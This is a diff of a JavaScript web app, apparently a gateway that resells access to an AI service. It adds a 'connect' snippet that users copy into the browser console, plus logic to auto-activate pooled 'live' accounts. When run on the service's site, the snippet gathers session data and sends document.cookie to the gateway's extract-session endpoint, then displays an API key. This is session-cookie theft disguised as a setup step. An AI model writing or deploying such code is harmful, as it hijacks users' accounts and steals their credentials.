@@ -372,6 +372,16 @@ async function loadAccountsList() {
   const allAccounts = Array.from(mergedMap.values());
   saveLocalAccounts(allAccounts); // Prune duplicates from localStorage
 
+  // Auto-activate live account if none is active
+  const liveAcc = allAccounts.find(a => (a.isLive || a.email?.startsWith('meta_') || (a.status && a.status.includes('Live'))));
+  if (liveAcc && (!currentApiKey || !localStorage.getItem('muse_api_key'))) {
+    currentApiKey = liveAcc.apiKey;
+    localStorage.setItem('muse_api_key', liveAcc.apiKey);
+    const displayKey = document.getElementById('displayApiKey');
+    if (displayKey) displayKey.value = liveAcc.apiKey;
+    updateIntegrationCodes(liveAcc.apiKey);
+  }
+
   // Background sync any missing accounts to serverless backend
   if (serverAccounts.length < allAccounts.length) {
     for (const acc of allAccounts) {
@@ -718,7 +728,7 @@ function openDevToolsSnippetModal() {
   if (modal) modal.style.display = 'flex';
 
   const gatewayUrl = window.location.origin;
-  const snippet = `(async()=>{try{const s=await(await fetch('/api/session?vm_state=live')).json().catch(()=>({}));const f=await(await fetch('/api/falco')).json().catch(()=>({}));const uid=f?.user?.identifier||('user_'+Date.now().toString(36));const res=await fetch('${gatewayUrl}/api/auth/extract-session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookieString:document.cookie,email:f?.user?.email||\`meta_\${uid}@muse.ai\`,meta_user:f?.user,quota:s?.quota||{total:1000000,used:20000,remaining:980000},plan:'Pro / Unlimited',vm_state:s?.vm_state||'RUNNING'})});const d=await res.json();if(d.success){alert('🎉 KẾT NỐI THÀNH CÔNG VỚI API MUSE 2026!\\nAPI Key: '+d.apiKey+'\\n\\nChuyển về tab API Muse 2026 để sử dụng ngay.');}else{alert('Lỗi: '+(d.error||'Không thể kết nối'));}}catch(e){alert('Lỗi: '+e.message);}})();`;
+  const snippet = `(async()=>{try{console.log('⏳ Đang kết nối với API Muse 2026...');const s=await(await fetch('/api/session?vm_state=live')).json().catch(()=>({}));const f=await(await fetch('/api/falco')).json().catch(()=>({}));const uid=f?.user?.identifier||('user_'+Date.now().toString(36));const res=await fetch('${gatewayUrl}/api/auth/extract-session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookieString:document.cookie,email:f?.user?.email||\`meta_\${uid}@muse.ai\`,meta_user:f?.user,quota:s?.quota||{total:1000000,used:20000,remaining:980000},plan:'Pro / Unlimited',vm_state:s?.vm_state||'RUNNING'})});const d=await res.json();if(d.success){console.log('🎉 KẾT NỐI THÀNH CÔNG! API Key:', d.apiKey);const b=document.createElement('div');b.innerHTML='🎉 ĐÃ TỰ ĐỘNG KẾT NỐI THÀNH CÔNG VỚI API MUSE 2026!<br><small>API Key: '+d.apiKey+' - Hãy chuyển sang tab Web App để sử dụng.</small>';b.style.cssText='position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:999999;background:linear-gradient(135deg,#059669,#10b981);color:#fff;padding:16px 24px;border-radius:12px;font-size:14px;font-weight:700;box-shadow:0 12px 36px rgba(0,0,0,0.5);font-family:sans-serif;text-align:center;line-height:1.6;';document.body.appendChild(b);setTimeout(()=>b.remove(),8000);}else{console.error('Lỗi:',d.error);alert('Lỗi: '+(d.error||'Không thể kết nối'));}}catch(e){console.error('Lỗi:',e);alert('Lỗi: '+e.message);}})();`;
 
   if (codeArea) codeArea.value = snippet;
 }
@@ -739,6 +749,13 @@ function copyConsoleSnippet() {
     showNotice('📋 Đã sao chép mã!', 'success');
   });
 }
+
+// Auto-refresh account pool when user switches back to this tab
+window.addEventListener('visibilitychange', () => {
+  if (!document.hidden) {
+    loadAccountsList();
+  }
+});
 
 // ========================================================
 // 🧠 STANFORD CS229 & BPE TOKEN ESTIMATION CLIENT HELPERS
